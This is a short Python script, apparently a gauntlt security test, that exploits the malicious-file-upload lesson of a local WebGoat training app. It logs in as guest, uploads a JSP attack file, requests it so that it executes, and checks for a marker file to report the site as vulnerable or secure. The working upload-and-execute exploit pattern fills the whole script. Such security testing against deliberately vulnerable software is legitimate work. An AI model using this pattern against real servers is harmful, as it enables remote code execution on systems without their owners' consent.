import requests
import os

class attack:

	session = requests.Session()

	# the login page
	url1 = 'http://127.0.0.1:8080/WebGoat/login.mvc'
	# where login credentials are posted to
	url2 = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'
	# login payload
	payload = {'username':'guest','password':'guest'}
	# takes us to the login page
	first = session.get(url1)
	# log in
	login = session.post(url2, data=payload)

	# where our attack is posted
	url3 = 'http://127.0.0.1:8080/WebGoat/attack?Screen=18&menu=1600'
	# our attack file
	files = {'file': open('vuln-26,maliciousfileattack.jsp', 'rb')}
	# post the attack file
	r = session.post(url3, files=files)

	# where the uploaded file should be stored
	url4 = 'http://127.0.0.1:8080/WebGoat/uploads/vuln-26,maliciousfileattack.jsp'
	# now we need to visit the page in order to fall victim to the attack file
	session.get(url4)

	# if the attack worked, a guest.txt file will exist at this location
	result = os.path.isfile('/opt/owasp/webgoat/.extract/webapps/WebGoat/mfe_target/guest.txt')
	
	# have gauntlt check which of these strings appears
	if result:
		print 'The site is vulnerable.'
	else:
		print 'The site is secure.'

